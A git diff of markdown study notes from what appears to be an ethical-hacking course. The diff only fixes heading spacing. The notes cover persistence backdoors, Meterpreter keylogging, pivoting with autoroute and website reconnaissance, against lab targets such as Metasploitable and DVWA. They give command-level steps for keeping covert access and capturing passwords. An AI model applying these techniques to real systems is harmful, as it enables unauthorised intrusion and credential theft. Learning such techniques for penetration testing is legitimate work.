-##Maintaining Access to the Target
+## Maintaining Access to the Target
 - with normal backdoors we use, we lose connection when the target computer is shut down
 - to overcome this, there are several methods, last of them is much more reliable and not seen by antivirus programs
 
-###Service Payloads
+### Service Payloads
 - in the veil, use a *rev_http_service* or *rev_tcp_service* instead, they are 7 and 9 in the list
 - you can directly use them while hacking or execute them when we open a meterpreter session with a normal backdoor
 - a little buggy so do not always works
 
-###Persistence Module in Meterpreter
+### Persistence Module in Meterpreter
 - in meterpreter, there is a module called persistence
 - execute it by *run persistence <options>*
 - run with *-h* to see the options to set
@@ -1100,7 +1100,7 @@ the router
 - do not forget to listen the incoming connections in another tab
 - it is detectable by antivirus programs so it is not preferred
 
-###Persistence Module in Metasploit
+### Persistence Module in Metasploit
 - after opening a session, background it and use a new module *exploit/windows/local/persistence*
 - then set its options
 - *DELAY* is the interval to connect back to us from the target, 10 seconds is good
@@ -1111,7 +1111,7 @@ the router
 - lastly, *exploit* to run the persistence attack so that the target connects to us everytime
 - metasploit gives a file to delete the backdoor from the target once we are done, so use it when you are finished with the target
 
-##Key Logging in Meterpreter
+## Key Logging in Meterpreter
 - this feature lets us see keyboard and mouse events running on the target computer
 - so this way, we can capture usernames and passwords
 - type *keyscan_start* to start the module in meterpreter
@@ -1120,7 +1120,7 @@ the router
 - type *screenshot* to save a screenshot of the target computer to ours
 - these commands help us see what the target is currently doing on the computer
 
-##Pivoting
+## Pivoting
 - it is the usage of a hacked computer to hack into other computers in the network
 - it is used when the target is not accessible by us directly, but a computer we can access can also access our target
 - this can be useful when we are not in the same network as our target, but we hack into a computer in our network which is also in the same network
@@ -1134,7 +1134,7 @@ as our target
 - we will set up a route between our subnet and the target's subnet
 - now background the session and set up the route like shown below
 
-###Autoroute
+### Autoroute
 - it is a module in metasploit to set up routes between subnets
 - enable it in metasploit by typing *use post/windows/manage/autoroute*
 - configure its settings by *set SESSION <session-id>* and *set SUBNET <XX.XX.XX.0>*
@@ -1142,7 +1142,7 @@ as our target
 - now *exploit* to access the machines that are in the new subnet
 - all the devices in the second network are accessible to us now and we can attack them using their local ip as before
 
-##Website
+## Website
 - a website is just an application installed on a computer
 - that computer has better specs than our everyday use computer but fundamentally it is a computer
 - it has an operating system and applications to allow it to act as a web server
@@ -1163,7 +1163,7 @@ as our target
 - it is a client-side language, the websites running javascript code executes it in the client's computer
 - so if we inject a virus to the javascript code, it will allow us to do things not on the server but on the person running that code
 
-##Attacking a Website
+## Attacking a Website
 - as stated earlier, the website is installed on a computer
 - so the attacks we learned so far also works for website attacking
 - server-side attacks are tested again the same way
@@ -1171,7 +1171,7 @@ as our target
 - if both of them fail, we test the web application by penetration testing
 - this attack allows us to hack into the website, not computer but they are all interconnected so we can jump from one to another
 
-##Web Application Penetration Testing
+## Web Application Penetration Testing
 - we are going to use Metasploitable to host a server to hack into
 - in Metasploitable, all the files in its local website are stored in */var/www*
 - access to that website from other computers in the same network using its local ip in the browser
@@ -1181,14 +1181,14 @@ as our target
 - go to *DVWA Security* and set the security level to low
 - also go to *Mutillidae* and set its security level to 0
 
-##Information Gathering
+## Information Gathering
 - the first thing to do before attacking a website
 - we try to get the ip address for the website, domain name, technologies used in it (which programming languages are used, what kind of server is
 it, which database is being used etc), DNS records, unlisted files, subdomains that are not listed to other people
 - to do information gathering, we can use Maltego, just start now with a website
 - use Zenmap or Nexpose for vulnerabilities
 
-##Whois Lookup
+## Whois Lookup
 - it is a protocol used to find owners of a internet resource
 - for example; a server, ip address or domain
 - there are lots of websites providing this service, *whois.domaintools.com* is a good choice
@@ -1197,7 +1197,7 @@ it, which database is being used etc), DNS records, unlisted files, subdomains t
 software
 - it also shows the operating system used in the server
 
-##Netcraft
+## Netcraft
 - it shows the technologies used by the website
 - its domain is *sitereport.netcraft.com*
 - it also shows the general information just like Whois Lookup
@@ -1215,41 +1215,41 @@ software
 - also look for web hosting service used in the website, if we can not find anything useful, we can try to hack into web hosting service to get
 access to the website
 
-##Robtex DNS Lookup
+## Robtex DNS Lookup
 - it shows a comprehensive report about the website
 - *robtex.com* is the website doing this job
 - there are a lot of sections in the report, jump to the one you need
 
-###Analysis
+### Analysis
 - general information about the target
 - the ip number is important because if we can not hack into the target website, we try to hack into any website installed in the same server
 - because these websites run in the same computer, we can access the target website through other websites
 
-###Quick Info
+### Quick Info
 - a short summary of the general informations
 
-###Reverse
+### Reverse
 - performs a *reverse DNS lookup*
 - in reverse lookup, we use an ip address to see which domains link to this ip address
 - this way, we learn other websites hosted on this server and hacking one of them is sufficient to get access to the target website
 - it does not always show all the websites in the same server
 - you have to click "view report as HTML" to see the list
 
-###Records
+### Records
 - more detailed information of the DNS records
 
-###SEO
+### SEO
 - search engine optimization
 - ranking of the website according to Alexa
 
-###WOT
+### WOT
 - web of trust reputation
 
-###DNSBL
+### DNSBL
 - DNS block information
 - contains websites known to send spam
 
-##Websites on the Same Server
+## Websites on the Same Server
 - generally, a server contains a large number of websites
 - if we can not find a vulnerability on the target website, we try the websites installed on the same server
 - if we can hack into just one of them, we can gain access to the whole server because it is a computer
@@ -1258,7 +1258,7 @@ access to the website
 - to find the websites pointing to a specific ip, use *robtex.com*
 - also you can list the websites with a specific ip by searching *ip:<ip>* in Bing
 
-##Subdomain
+## Subdomain
 - urls generally come as *subdomain.target.com*
 - for example, *www*, *mail*, *beta*, *user*
 - some websites have subdomains for their own users(employees or customers)
@@ -1270,14 +1270,14 @@ access to the website
 - use *Knock* to find subdomains of a website
 - the subdomains are not forbidden pages to load, they are just not shown to other people so they do not know the existence of that page
 
-##Knock
+## Knock
 - it finds subdomains of a target website
 - go into the "knockpy" folder in the terminal
 - then use the command *python knock.py <ip>*
 - it will show some information about the websites and lists the results of a search for subdomains
 - to navigate to those subdomains, just copy paste the url to the web browser
 
-##Files and Directories in the Website
+## Files and Directories in the Website
 - files and directories stored in the target website or the server
 - this files are important because they could contain valuable information about the website
 - when we navigate to a directory in a website, the url changes to *<earlier-url>/<directory>*
